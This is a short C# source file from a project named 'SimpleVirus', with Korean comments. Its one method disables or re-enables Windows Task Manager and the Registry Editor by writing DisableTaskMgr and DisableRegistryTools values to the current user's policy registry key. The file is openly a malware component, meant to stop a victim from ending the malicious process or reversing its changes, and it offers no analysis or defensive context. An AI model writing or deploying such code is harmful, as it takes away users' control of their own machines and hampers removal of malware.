using Microsoft.Win32;

namespace SimpleVirus
{
    public enum PoliciesType
    {
        TaskManager,
        RegistryTools
    };

    internal class Policies
    {
        /// <summary>
        /// PC의 정책을 변경
        /// </summary>
        /// <param name="setting">정책 종류</param>
        /// <param name="enable">활성화 여부</param>
        public static void SetPoliciesSetting(PoliciesType setting, bool enable)
        {
            const string registryKeyPath = @"Software\Microsoft\Windows\CurrentVersion\Policies\System";
            string keyValue = (setting == PoliciesType.TaskManager) ?
                "DisableTaskMgr" : "DisableRegistryTools";

            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(registryKeyPath);

            if (enable && objRegistryKey.GetValue(keyValue) != null)
                objRegistryKey.DeleteValue(keyValue); // 키 삭제 
            else if (!enable)
                objRegistryKey.SetValue(keyValue, 1, RegistryValueKind.DWord);

            objRegistryKey.Close();
        }

    }
}
